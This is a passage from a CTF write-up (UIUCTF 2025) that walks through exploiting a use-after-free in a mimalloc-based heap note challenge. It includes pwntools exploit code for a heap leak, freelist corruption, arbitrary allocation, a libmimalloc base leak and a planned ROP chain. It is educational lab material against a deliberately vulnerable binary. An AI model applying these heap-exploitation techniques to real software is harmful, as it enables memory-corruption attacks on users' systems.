</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">notes</span><span class="p">[</span><span class="n">number</span><span class="p">],</span> <span class="n">NOTE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>This is a standard heap challenge where you can create, delete, read, and edit chunks. Inside the <code>get_index</code> function, there’s a check to ensure that the index stays within the valid range of 0–15. However, there are no additional checks, which means we can reuse the same index multiple times.</p>
<p>There’s also a bug in the delete function: after freeing a chunk, the corresponding pointer is not set to <code>NULL</code>. This results in a Use-After-Free (UAF) vulnerability.</p>
<h2 id="setup-1">Setup</h2>
<p>For this challenge, I decided to run it using Docker, so I created a build script.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/bash 
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">docker build -t chall .
</span></span><span class="line"><span class="cl">docker run --privileged -p 1337:1337 chall</span></span></code></pre></div></div>
<p>My exploit template for this challenge is:</p>
<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./chal&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libmimalloc.so.2.2&#34;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delim</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">u32d</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">u64d</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">position</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">position</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">position</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>python3 solve.py REMOTE 127.0.0.1 1337</code></pre></div>
<p>I also created a GDB script similar to the one I used in the baby kernel challenge.
When running the container and my exploit script, I launch GDB with the following command:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>sudo gdb -p $(pgrep -fxn /home/user/chal) -x gdbscript</code></pre></div>
<h2 id="exploitation-1">Exploitation</h2>
<p>I first focused on how to get a leak.</p>
<p>When we allocate a chunk, a new section/page is created. The structure of the chunk looks like this:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/chunk.png"
        data-srcset="/posts/uiuctf_2025/images/chunk.png, /posts/uiuctf_2025/images/chunk.png 1.5x, /posts/uiuctf_2025/images/chunk.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/chunk.png"
        title="img" width="1213" height="760" /></p>
<p>We can see that the chunk contains a pointer, which points to the next free chunk in the freelist. Using the <a href="https://github.com/bata24/gef" target="_blank" rel="noopener noreffer ">bata24</a> of GEF, we can inspect the heap with the command <code>mimalloc-heap-dump</code>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/mimalloccmd.png"
        data-srcset="/posts/uiuctf_2025/images/mimalloccmd.png, /posts/uiuctf_2025/images/mimalloccmd.png 1.5x, /posts/uiuctf_2025/images/mimalloccmd.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/mimalloccmd.png"
        title="img" width="1698" height="1014" /></p>
<p>This confirms that the pointer inside our chunk indeed references the next free chunk. Each chunk in the freelist has a similar pointer to the next available chunk. If we can overwrite this pointer, we can potentially allocate chunks at arbitrary memory addresses.</p>
<p>After deleting the chunk, the internal freelist pointer is removed:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/free.png"
        data-srcset="/posts/uiuctf_2025/images/free.png, /posts/uiuctf_2025/images/free.png 1.5x, /posts/uiuctf_2025/images/free.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/free.png"
        title="img" width="817" height="356" /></p>
<p>However, we still retain a reference to that chunk through the global <code>notes</code> array. If we delete the same chunk again (i.e., a double free), the chunk is added back to the freelist:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/doublefree.png"
        data-srcset="/posts/uiuctf_2025/images/doublefree.png, /posts/uiuctf_2025/images/doublefree.png 1.5x, /posts/uiuctf_2025/images/doublefree.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/doublefree.png"
        title="img" width="1189" height="470" /></p>
<p>This allows us to read the freed chunk and leak its address. From there, we can calculate the offset to the start of the memory page and use it as part of our exploitation strategy.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x10080</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Heap leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Heap base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">)</span></span></span></code></pre></div></div>
<p>Now that we’ve leaked the chunk address and calculated the base of the memory page, the next step is to leak the base address of the libmimalloc library. At the start of the page resides the <a href="https://github.com/microsoft/mimalloc/blob/v2.2.4/include/mimalloc/types.h#L320" target="_blank" rel="noopener noreffer "><code>mi_page_t</code></a> structure. This struct contains several pointers, some of which reference thread-local storage (TLS) and internal structures within libmimalloc:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/mimallocptr.png"
        data-srcset="/posts/uiuctf_2025/images/mimallocptr.png, /posts/uiuctf_2025/images/mimallocptr.png 1.5x, /posts/uiuctf_2025/images/mimallocptr.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/mimallocptr.png"
        title="img" width="1566" height="477" /></p>
<p>If we can allocate a chunk at the beginning of the page (where mi_page_t is located), we can read these internal pointers and leak addresses inside libmimalloc.</p>
<p>So how can we edit the freelist pointer to perform arbitrary chunk allocation? Can we simply allocate a chunk, free it, overwrite the freelist pointer, and allocate again?</p>
<p>Let’s take a closer look at the comments above the mi_page_t struct in the source code.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>// A page contains blocks of one specific size (`block_size`).
// Each page has three list of free blocks:
// `free` for blocks that can be allocated,
// `local_free` for freed blocks that are not yet available to `mi_malloc`
// `thread_free` for freed blocks by other threads
// The `local_free` and `thread_free` lists are migrated to the `free` list
// when it is exhausted. The separate `local_free` list is necessary to
// implement a monotonic heartbeat. The `thread_free` list is needed for
// avoiding atomic operations in the common case.</code></pre></div>
<p>We know that mimalloc maintains three distinct free lists: <code>free</code>, <code>local_free</code>, and <code>thread_free</code>. When a chunk is freed, it is initially placed into the local_free list. As a result, subsequent allocations won’t immediately return that recently freed chunk — instead, allocations are served from the free list:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/freelist.png"
        data-srcset="/posts/uiuctf_2025/images/freelist.png, /posts/uiuctf_2025/images/freelist.png 1.5x, /posts/uiuctf_2025/images/freelist.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/freelist.png"
        title="img" width="715" height="984" /></p>
<p>From the source code comments, we see:</p>
<blockquote>
<p>The local_free and thread_free lists are migrated to the free list when it is exhausted.</p></blockquote>
<p>This behavior gives us an idea: if we allocate and then immediately free a chunk repeatedly — enough times to exhaust the free list — all of those chunks from local_free will eventually be migrated back into the free list.</p>
<p>Here’s what that looks like in practice:</p>
<ul>
<li>After exhausting the <code>free</code> list, <code>local_free</code> fills up with freed chunks:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/freelist2.png"
        data-srcset="/posts/uiuctf_2025/images/freelist2.png, /posts/uiuctf_2025/images/freelist2.png 1.5x, /posts/uiuctf_2025/images/freelist2.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/freelist2.png"
        title="img" width="870" height="1042" /></li>
</ul>
<p>On the next allocation, <code>mimalloc</code> migrates the <code>local_free</code> chunks into the free list, making them available for reuse:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/freelist3.png"
        data-srcset="/posts/uiuctf_2025/images/freelist3.png, /posts/uiuctf_2025/images/freelist3.png 1.5x, /posts/uiuctf_2025/images/freelist3.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/freelist3.png"
        title="img" width="675" height="1006" /></p>
<p>And this can be triggered like so:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">19</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></span></span></code></pre></div></div>
<p>Now that all previously freed chunks have been migrated to the free list, we can begin manipulating the heap. Looking at the notes array:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/notes.png"
        data-srcset="/posts/uiuctf_2025/images/notes.png, /posts/uiuctf_2025/images/notes.png 1.5x, /posts/uiuctf_2025/images/notes.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/notes.png"
        title="img" width="1041" height="245" /></p>
<p>We have three pointers that correspond to our allocated chunks. Let&rsquo;s use the chunk at index 0 to corrupt the freelist pointer.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span></span></span></code></pre></div></div>
<p>After this, we can confirm that the freelist is indeed corrupted:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/corruptedlist.png"
        data-srcset="/posts/uiuctf_2025/images/corruptedlist.png, /posts/uiuctf_2025/images/corruptedlist.png 1.5x, /posts/uiuctf_2025/images/corruptedlist.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/corruptedlist.png"
        title="img" width="472" height="155" /></p>
<p>If we now attempt to allocate twice, the allocator will eventually follow our corrupted pointer and crash inside <code>mi_malloc</code>, as it attempts to access an invalid address:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/crashmalloc.png"
        data-srcset="/posts/uiuctf_2025/images/crashmalloc.png, /posts/uiuctf_2025/images/crashmalloc.png 1.5x, /posts/uiuctf_2025/images/crashmalloc.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/crashmalloc.png"
        title="img" width="1369" height="413" /></p>
<p>With this primitive, we now have arbitrary control over the freelist pointer — allowing us to allocate memory at any address. This lets us place a chunk at the top of the mimalloc page, where important internal pointers (including ones into the libmimalloc library) are stored.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x190</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[</span><span class="mi">48</span><span class="p">:</span><span class="mi">48</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x2b100</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Libc leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">libc_leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span></span></span></code></pre></div></div>
<p>We successfully leaked the libmimalloc address and subtracted the appropriate offset to recover its base address.</p>
<p>However, there&rsquo;s now a problem: the freelist is corrupted, so further allocations will crash. Fortunately, we allocated a chunk at index 1 at address <code>heap_base + 0x190</code>, which points directly to the <code>free</code> member of the <code>mi_page_t</code> struct. This gives us a reliable write primitive to repair the freelist when needed.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span></span></span></code></pre></div></div>
<p>This allows us to continue performing arbitrary chunk allocations as before. After each corruption, we can simply use index 1 again to fix the freelist and maintain heap stability.</p>
<p>Even though libmimalloc is compiled with full protections (e.g., full RELRO, NX, PIE), it still contains a rich set of ROP gadgets. My plan was to construct a ROP chain. To locate the stack, I leaked the address of environ.</p>
<p>We can observe that environ is stored near Thread-Local Storage (TLS):</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/environ.png"
        data-srcset="/posts/uiuctf_2025/images/environ.png, /posts/uiuctf_2025/images/environ.png 1.5x, /posts/uiuctf_2025/images/environ.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/environ.png"
        title="img" width="1588" height="289" /></p>
<p>Conveniently, the mi_page_t struct includes a pointer to TLS. Using the same arbitrary allocation technique as before, we can place a chunk at environ, giving us the stack address.</p>
<p>From there, we can calculate the return address (RIP) at the end of the edit function.</p>
